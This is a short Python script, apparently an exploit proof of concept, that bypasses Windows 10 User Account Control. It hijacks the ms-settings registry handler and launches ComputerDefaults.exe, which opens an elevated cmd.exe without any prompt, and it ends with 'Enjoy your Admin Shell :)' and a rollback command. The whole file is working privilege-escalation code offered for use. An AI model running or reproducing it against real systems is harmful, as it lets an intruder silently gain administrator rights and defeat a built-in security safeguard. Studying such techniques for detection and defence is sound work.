#!/usr/bin/env python
#
#  Windows 10 UAC Bypass (computerDefault)
#  @404death

import os
import sys
import ctypes
import _winreg


def create_reg_key(key, value):
    try:        
        _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command')
        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, 'Software\Classes\ms-settings\shell\open\command', 0, _winreg.KEY_WRITE)                
        _winreg.SetValueEx(registry_key, key, 0, _winreg.REG_SZ, value)        
        _winreg.CloseKey(registry_key)
    except WindowsError:        
        raise

def exec_bypass_uac(cmd):
    try:
        create_reg_key('DelegateExecute', '')
        create_reg_key(None, cmd)    
    except WindowsError:
        raise

def bypass_uac():        
 try:                
    current_dir = os.path.dirname(os.path.realpath(__file__)) + '\\' + __file__
    cmd = "C:\windows\System32\cmd.exe"
    exec_bypass_uac(cmd)                
    os.system(r'C:\windows\system32\ComputerDefaults.exe')  
    return 1               
 except WindowsError:
    sys.exit(1)       

if __name__ == '__main__':

    if bypass_uac():
		print "Enjoy your Admin Shell :)"

# rollback_command : reg delete HKCU\Software\Classes\ms-settings\Shell\Open\command /f
